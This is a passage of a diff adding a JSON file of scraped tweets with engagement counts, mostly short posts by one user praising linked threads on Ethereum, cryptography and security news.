+            "num_retweets": 26,
+            "num_replies": 1
+        },
+        "943862578740113409": {
+            "id": "943862578740113409",
+            "text": "C'mon Verisign: You had ONE job! https://knowledge.verisign.com/\u00a0pic.twitter.com/AItGovU4iv",
+            "username": "briankrebs",
+            "num_likes": 648,
+            "num_retweets": 273,
+            "num_replies": 20
+        },
+        "942153908490706944": {
+            "id": "942153908490706944",
+            "text": "Facebook Security is proud to announce that we are offering a free twelve-week hands-on course for veterans who desire to get into cybersecurity. Please make sure to apply by January 16th!http://fbcodepath.splashthat.com\u00a0",
+            "username": "alexstamos",
+            "num_likes": 3048,
+            "num_retweets": 2270,
+            "num_replies": 89
+        },
+        "943164990533578752": {
+            "id": "943164990533578752",
+            "text": "I'm with Vitalik. (https://twitter.com/Snowden/status/913544739542241282\u00a0\u2026) \nZero-knowledge proofs may be the future of private trade.https://twitter.com/rhhackett/status/942799687844851713\u00a0\u2026",
+            "username": "Snowden",
+            "num_likes": 2109,
+            "num_retweets": 837,
+            "num_replies": 94
+        },
+        "942871691348209664": {
+            "id": "942871691348209664",
+            "text": "pic.twitter.com/l17JsCPRaa",
+            "username": "defcon",
+            "num_likes": 2881,
+            "num_retweets": 1449,
+            "num_replies": 25
+        },
+        "941320476894334977": {
+            "id": "941320476894334977",
+            "text": "Finally managed to quit vim.pic.twitter.com/FgapmqaYKw",
+            "username": "brunns",
+            "num_likes": 14784,
+            "num_retweets": 6487,
+            "num_replies": 301
+        },
+        "941346300246634496": {
+            "id": "941346300246634496",
+            "text": "We need to define a hiarchy of privacy issues for crypto currencies. Easy: hide value. Moderate: unlinkability for a single payment. Hard: privacy for repeated and arbitrary payments. Most don't get to level 3, yet it's critical.",
+            "username": "secparam",
+            "num_likes": 36,
+            "num_retweets": 6,
+            "num_replies": 0
+        },
+        "941695796881190912": {
+            "id": "941695796881190912",
+            "text": "Falcon 9 first stage has landed at Landing Zone 1 \u2014 SpaceX\u2019s 20th recovery of a first stage booster.pic.twitter.com/DHLAf7hq7t",
+            "username": "SpaceX",
+            "num_likes": 21987,
+            "num_retweets": 4255,
+            "num_replies": 400
+        },
+        "930756578956926982": {
+            "id": "930756578956926982",
+            "text": "Wow.https://twitter.com/CDA/status/930756531368415232\u00a0\u2026",
+            "username": "ralphholz",
+            "num_likes": 1,
+            "num_retweets": 1,
+            "num_replies": 0
+        },
+        "892119494386208768": {
+            "id": "892119494386208768",
+            "text": "I tried. http://www.phdcomics.com/comics.php?f=1967\u00a0\u2026pic.twitter.com/aaGYHpYmKD",
+            "username": "PHDcomics",
+            "num_likes": 2216,
+            "num_retweets": 1382,
+            "num_replies": 26
+        },
+        "914974532082991104": {
+            "id": "914974532082991104",
+            "text": "Draining the wallets - pwning \"the world's most secure Bitcoin Wallet & Exchange\" #infosechttps://s3cur3.it/blog/4\u00a0",
+            "username": "robertchrk",
+            "num_likes": 120,
+            "num_retweets": 96,
+            "num_replies": 6
+        },
+        "912254053849079808": {
+            "id": "912254053849079808",
+            "text": "on High Sierra (unsigned) apps can programmatically dump & exfil keychain (w/ your plaintext passwords) vid: https://player.vimeo.com/video/235313957\u00a0 #smhpic.twitter.com/pqtpjZsSnq",
+            "username": "patrickwardle",
+            "num_likes": 1356,
+            "num_retweets": 1435,
+            "num_replies": 72
+        }
+    },
+    "tweeted": {
+        "1124147323414519809": {
+            "id": "1124147323414519809",
+            "text": "Next step, switch emulator on the Windows boot just to complete the circle? :Dhttps://twitter.com/grufwub/status/1123929561098485765\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1123093272551780352": {
+            "id": "1123093272551780352",
+            "text": "Epic! Looking forward to it!https://twitter.com/BsidesSyd_Org/status/1117739046174740480\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1120489320694067201": {
+            "id": "1120489320694067201",
+            "text": "Awesome read!https://twitter.com/barnabemonnot/status/1119460616551288832\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1098479941790777349": {
+            "id": "1098479941790777349",
+            "text": "Woah! Pretty cool to see, great read as well!https://twitter.com/MihailoBjelic/status/1098190200612839424\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 3,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1087952484969136128": {
+            "id": "1087952484969136128",
+            "text": "Very interesting read!https://twitter.com/socrates1024/status/1087820949909618689\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 2,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1085710423142219779": {
+            "id": "1085710423142219779",
+            "text": "Calm down weather https://twitter.com/BOM_NSW/status/1085430520157270018\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1083110669807869952": {
+            "id": "1083110669807869952",
+            "text": "Original paper was an excellent read, excited to see the SABRE paper!https://twitter.com/lvanbever/status/1083006750528364544\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1082414296506675200": {
+            "id": "1082414296506675200",
+            "text": "These comments are great! https://twitter.com/coinbase/status/1082364714246582274\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1082037368339652608": {
+            "id": "1082037368339652608",
+            "text": "\"Talent is everywhere. Opportunity is not.\" \n\nThis is a pretty powerful thread, and definitely a good read.https://twitter.com/mekkaokereke/status/1081619342377156608\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 3,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1076447652936482817": {
+            "id": "1076447652936482817",
+            "text": "Awesome stuff!https://twitter.com/raiden_network/status/1076145399910543361\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1072023491954671616": {
+            "id": "1072023491954671616",
+            "text": "Lighthouse update tweetstorm! https://twitter.com/paulhauner/status/1072023254322176000\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1070820529978847232": {
+            "id": "1070820529978847232",
+            "text": "This is an excellent step forward, peer reviewing will definitely increase the quality and adoption! Excellent work!https://twitter.com/muneeb/status/1070755328160079875\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 3,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1070226864302510080": {
+            "id": "1070226864302510080",
+            "text": "https://twitter.com/internetofshit/status/1059932872163975169\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1070225901235843073": {
+            "id": "1070225901235843073",
+            "text": "Awesome!https://twitter.com/RosuGrigore/status/1070012238797438976\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1070225551430828033": {
+            "id": "1070225551430828033",
+            "text": "Great way to understand for non-tech!https://twitter.com/tomsulston/status/1070118335294009344\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1069505939894525952": {
+            "id": "1069505939894525952",
+            "text": "Excellent read!https://twitter.com/zmanian/status/1069453739814092801\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 2,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1068104548634419200": {
+            "id": "1068104548634419200",
+            "text": " awesome!https://twitter.com/adrien_jeanneau/status/1068073657073836032\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1068102417076473856": {
+            "id": "1068102417076473856",
+            "text": "Actually pretty insane!https://twitter.com/feross/status/1068038193868460032\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1065492764798812160": {
+            "id": "1065492764798812160",
+            "text": "Any recommendations for good podcasts? I'm keen for distributed systems / cryptography / maths / blockchain stuff but also keen for things to switch my mind away from work.  #podcasts? #blockchain? #cryptography? #consensus?",
+            "username": "_chrisnatoli",
+            "num_likes": 3,
+            "num_retweets": 0,
+            "num_replies": 3
+        },
+        "1065491757893222400": {
+            "id": "1065491757893222400",
+            "text": "Awesome!https://twitter.com/Khovr/status/1065294919210860546\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1065083488309719040": {
+            "id": "1065083488309719040",
+            "text": "Wow!https://twitter.com/DoveyWan/status/1064878600594305025\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1064285642555777024": {
+            "id": "1064285642555777024",
+            "text": "Wise words!https://twitter.com/socrates1024/status/1063252867396583424\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1062609461448138753": {
+            "id": "1062609461448138753",
+            "text": "https://twitter.com/AcademicsSay/status/1062539865190002689\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 2,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1060189469209518081": {
+            "id": "1060189469209518081",
+            "text": "Post #devcon4 Lighthouse update Get on it!https://twitter.com/paulhauner/status/1060188770790559744\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 3,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1059099714455404546": {
+            "id": "1059099714455404546",
+            "text": "Leaving Prague today after an amazing @EFDevcon. What an amazing time with such awesome talks and things to learn! Everyone involved should definitely be commended on such an awesome event! Time to keep learning more  #ethereum #DEVCON4",
+            "username": "_chrisnatoli",
+            "num_likes": 7,
+            "num_retweets": 1,
+            "num_replies": 0
+        },
+        "1059097147138760704": {
+            "id": "1059097147138760704",
+            "text": "Awesome!!!  I've been reading since the release, definitely interested!https://twitter.com/VladZamfir/status/1059091271216549889\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 1
+        },
+        "1057985684919775233": {
+            "id": "1057985684919775233",
+            "text": "Epic! :D Excited for the talk as well!https://twitter.com/drakefjustin/status/1057981173555781632\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1057936613932707840": {
+            "id": "1057936613932707840",
+            "text": "Quite an awesome read!https://twitter.com/socrates1024/status/1057746023584595981\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 1
+        },
+        "1055324663683919872": {
+            "id": "1055324663683919872",
+            "text": "Absolutely amazing summit! Excellent talks and excellent people. Definitely encourage people to watch the talks! https://twitter.com/web3foundation/status/1055165686887124993\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 2,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1048064758614642694": {
+            "id": "1048064758614642694",
+            "text": "Awesome stuff! \nGet on the new Lighthouse Update!https://twitter.com/paulhauner/status/1048052979465510912\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1044737424490811392": {
+            "id": "1044737424490811392",
+            "text": "Excellent list!https://twitter.com/matthew_d_green/status/825955878234763264\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1044712568307179520": {
+            "id": "1044712568307179520",
+            "text": "Epic!https://twitter.com/CyDef_Unicorn/status/1044286786174943233\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1041886796500488193": {
+            "id": "1041886796500488193",
+            "text": "Very good read and definitely some lessons to learn!https://twitter.com/whitequark/status/1041434810366013440\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 2,
+            "num_retweets": 1,
+            "num_replies": 0
+        },
+        "1041601831820943360": {
+            "id": "1041601831820943360",
+            "text": "Check it out! :Dhttps://twitter.com/paulhauner/status/1041597854731493376\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1040374937670836226": {
+            "id": "1040374937670836226",
+            "text": "An excellent dive into understanding smart contracts and has some great literature included! Great thread!https://twitter.com/ZachSmolinski/status/1039910747646685190\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1034674482030362625": {
+            "id": "1034674482030362625",
+            "text": "Woah! This should be interesting to follow!https://twitter.com/Viviand__/status/1034639223284875264\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 1
+        },
+        "1033875267150700544": {
+            "id": "1033875267150700544",
+            "text": "This is actually an excellent read, kind of shocking but definitely a worthwhile read!https://twitter.com/atomicthumbs/status/1032939617404645376\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1033339499445506051": {
+            "id": "1033339499445506051",
+            "text": "Excellent read! Thanks @paulhauner ! Everyone check it out :)https://twitter.com/paulhauner/status/1033250889610350592\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 3,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1032061727259545601": {
+            "id": "1032061727259545601",
+            "text": "Great slides and an awesome intro to Ethereum 2.0! Covers the high level of sharding and PoS!https://twitter.com/SydEthereum/status/1032050406807879680\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 2,
+            "num_retweets": 0,
+            "num_replies": 1
+        },
+        "1031684715084800000": {
+            "id": "1031684715084800000",
+            "text": "Amazing!https://twitter.com/newmichwill/status/1031577869548314624\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1026887577041682432": {
+            "id": "1026887577041682432",
+            "text": "Great news! Letsencrypt is amazing!https://twitter.com/ISOCtech/status/1026861606381252608\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 2,
+            "num_retweets": 1,
+            "num_replies": 0
+        },
+        "1016098317388820480": {
+            "id": "1016098317388820480",
+            "text": "This is crazyhttps://twitter.com/lopp/status/1015945799652474880\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1014900390255419392": {
+            "id": "1014900390255419392",
+            "text": "This is an interesting way of looking at it, exciting!https://twitter.com/VladZamfir/status/1014882947781087233\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1009354333412921344": {
+            "id": "1009354333412921344",
+            "text": "Excellent article from Age at Sigma Prime outlining solidity vulnerabilities and addressing potential solitions! #solidity devs should definitely check it out, extremely useful!https://blog.sigmaprime.io/solidity-security.html\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 2,
+            "num_retweets": 2,
+            "num_replies": 0
+        },
+        "1009350389580218370": {
+            "id": "1009350389580218370",
+            "text": "This would be my absolute dream! Someone do this to me when I finish!https://twitter.com/dougwebberecon/status/1008782717167849473\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 3,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1007820541078614016": {
+            "id": "1007820541078614016",
+            "text": "Excellent read!https://twitter.com/cryptowanderer/status/1007664297328234496\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1007592312514342912": {
+            "id": "1007592312514342912",
+            "text": "Cool!https://twitter.com/polkadotnetwork/status/1006997220296724481\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1001973072247820288": {
+            "id": "1001973072247820288",
+            "text": "Parity Casper! Good times ahead! https://twitter.com/ParityTech/status/1001753206865752067\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1001972828978188289": {
+            "id": "1001972828978188289",
+            "text": "Great read!https://twitter.com/ethchris/status/1001869517574823936\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "1001015055830237184": {
+            "id": "1001015055830237184",
+            "text": "Impressivehttps://twitter.com/VitalikButerin/status/1000869482980564992\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "996894474683875328": {
+            "id": "996894474683875328",
+            "text": "Yes! Awesome news!https://twitter.com/ethchris/status/996793342234189826\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "996170983336652800": {
+            "id": "996170983336652800",
+            "text": "https://twitter.com/ethchris/status/996128218213216259\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "995917310320783362": {
+            "id": "995917310320783362",
+            "text": "https://twitter.com/seecurity/status/995906576170053633\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "993996915028123648": {
+            "id": "993996915028123648",
+            "text": "Most nutritious meal ever  alongside a cup of imposter syndrome of course!https://twitter.com/jeeger/status/993748199641894912\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "993045455847084032": {
+            "id": "993045455847084032",
+            "text": "Excellent thread! Excellent ideas!https://twitter.com/sinahab/status/992755776765792256\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 1,
+            "num_replies": 0
+        },
+        "991456941606977536": {
+            "id": "991456941606977536",
+            "text": "Whoa!https://twitter.com/signalapp/status/991390077937946625\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "989289937924059136": {
+            "id": "989289937924059136",
+            "text": "This is actually a good pointhttps://twitter.com/LefterisJP/status/989188337062891527\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "988958026911498240": {
+            "id": "988958026911498240",
+            "text": "Scary stuff!https://twitter.com/myetherwallet/status/988830652526092288\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "988746982901469186": {
+            "id": "988746982901469186",
+            "text": "Airgap bypass! \nWhaaaaaaaat! \n\nThis is insane!https://twitter.com/x0rz/status/988699495331520512\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "988606463072354306": {
+            "id": "988606463072354306",
+            "text": "Empire multi user GUI! Much wow! https://twitter.com/DisK0nn3cT/status/988441545236885504\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "987115335080853504": {
+            "id": "987115335080853504",
+            "text": "Great read, some interesting info!https://twitter.com/AaronToponce/status/986975608767836160\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 2,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "987114040164888577": {
+            "id": "987114040164888577",
+            "text": "Excellent slides to hear about Parity substrate!https://twitter.com/gavofyork/status/986964220708257792\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "987113374952521728": {
+            "id": "987113374952521728",
+            "text": "Epic!https://twitter.com/zeligf/status/987024798994837504\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "986380138085404672": {
+            "id": "986380138085404672",
+            "text": "I think the last bit is incredibly important to address, make a wallet that an everyday person would be able to use with the added thoughts that it's not centralised and its secure.https://twitter.com/VitalikButerin/status/986101152235188224\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 1
+        },
+        "986377750905667585": {
+            "id": "986377750905667585",
+            "text": "Yay! Solidity with revert reasoning :D \nCheck it out!https://twitter.com/ethchris/status/986141734890627072\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 2,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "985796905874538497": {
+            "id": "985796905874538497",
+            "text": "As accurate as it gets  already me and I'm half way haha \n\nSupervisor: what's your progress on this. \n\nMe: but these nice tables and tikz drawings though \n\nhttps://twitter.com/jeeger/status/985793417065189376\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 2,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "984213093063344130": {
+            "id": "984213093063344130",
+            "text": "An excellent read! Great intro and insight into some of the tools and techniques used for recon! https://twitter.com/adrien_jeanneau/status/983995511169568768\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "984210019376771073": {
+            "id": "984210019376771073",
+            "text": "SecureRandom vulns!https://twitter.com/jedisct1/status/983595822364463104\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "983838260710424576": {
+            "id": "983838260710424576",
+            "text": "#polkadot transactions going through! Interesting times ahead. https://twitter.com/gavofyork/status/983808148170592257\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 2,
+            "num_retweets": 0,
+            "num_replies": 1
+        },
+        "983482926661709824": {
+            "id": "983482926661709824",
+            "text": "Court ordered a \"rescue fork\". Interesting legal action in the blockchain space, the first of possibly many?https://twitter.com/stephendpalley/status/982353358915801088\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "981349722446118913": {
+            "id": "981349722446118913",
+            "text": "Fork resolution through validator approval! ... I mean merge request :Phttps://twitter.com/bcrypt/status/981261301153280000\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "981110375813820416": {
+            "id": "981110375813820416",
+            "text": "Actually a great thread to read. Interesting points raised by Vitalik. Thoughts?https://twitter.com/VitalikButerin/status/981069924255739904\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "978872114697654272": {
+            "id": "978872114697654272",
+            "text": "Excellent resources in this, definitely something good to read through!https://twitter.com/x0rz/status/978653778005168128\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "978419328520343552": {
+            "id": "978419328520343552",
+            "text": "Oh shiiiiiiet! :Dhttps://twitter.com/darksim905/status/977256948918874112\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "978418689404936193": {
+            "id": "978418689404936193",
+            "text": "Excellent work!https://twitter.com/paulhauner/status/978075285219258369\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "976979646418894848": {
+            "id": "976979646418894848",
+            "text": "Hah! How accurate https://twitter.com/random_walker/status/976836626121977858\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "976977516270206976": {
+            "id": "976977516270206976",
+            "text": "Very interesting question! I would like to see how this goes.https://twitter.com/VladZamfir/status/976520235120582656\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "976411738571603968": {
+            "id": "976411738571603968",
+            "text": "Super awesome resources! :Dhttps://twitter.com/reneil1337/status/972920303155404800\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "976287768182534144": {
+            "id": "976287768182534144",
+            "text": "That's a big number! No wonder there's some problemshttps://twitter.com/x0rz/status/976038025888174080\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "976108543215517699": {
+            "id": "976108543215517699",
+            "text": "Oh wow!https://twitter.com/matthew_d_green/status/976066416267939840\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "972775388844670977": {
+            "id": "972775388844670977",
+            "text": "Awesome!https://twitter.com/KamilBrejcha/status/972438246528569344\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "972451967212470272": {
+            "id": "972451967212470272",
+            "text": "Woah! This isn't good news!https://twitter.com/Snowden/status/972110541408952320\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "972127088760184832": {
+            "id": "972127088760184832",
+            "text": "https://twitter.com/Alra3ees/status/971706200235696129\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "972126688749412352": {
+            "id": "972126688749412352",
+            "text": "Wow. Nation-state level attack! Will be an interesting read! https://twitter.com/HowellONeill/status/971800807136833536\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "972025897640275969": {
+            "id": "972025897640275969",
+            "text": "Woah! This is great!https://twitter.com/VladZamfir/status/971769011078823936\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "971712005353558016": {
+            "id": "971712005353558016",
+            "text": "Interesting times ahead this year! :)https://twitter.com/maxscience/status/971681609203224577\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "971630651018428416": {
+            "id": "971630651018428416",
+            "text": "Great read! Interesting threadhttps://twitter.com/ameensol/status/971422805601505280\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "971630244296777728": {
+            "id": "971630244296777728",
+            "text": "This is actually great!https://twitter.com/AlenaSatoshi/status/971301348787539969\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "971629343905521664": {
+            "id": "971629343905521664",
+            "text": "oops! hahahttps://twitter.com/pcgamer/status/971448666933342208\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "971512480424804352": {
+            "id": "971512480424804352",
+            "text": "Story of my life https://twitter.com/MkHeck/status/971127761145352193\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "970465526299336705": {
+            "id": "970465526299336705",
+            "text": "This! https://twitter.com/404death/status/968381431146778624\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "966976556227731456": {
+            "id": "966976556227731456",
+            "text": "Excellent post! Excited for the upcoming blog :)https://twitter.com/Chazb0t/status/966652428841029632\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "966854973630832641": {
+            "id": "966854973630832641",
+            "text": "Cool!https://twitter.com/maraoz/status/966335598993735683\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "966624956455960576": {
+            "id": "966624956455960576",
+            "text": "As accurate as you can get! Made me laugh!https://twitter.com/SimonOusager/status/966346290861891584\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "966423583005159426": {
+            "id": "966423583005159426",
+            "text": "Well said!https://twitter.com/BobSummerwill/status/965980350806552577\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "966218713312591872": {
+            "id": "966218713312591872",
+            "text": "They're everywhere now!https://twitter.com/campuscodi/status/966180684447412224\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "966085793616818176": {
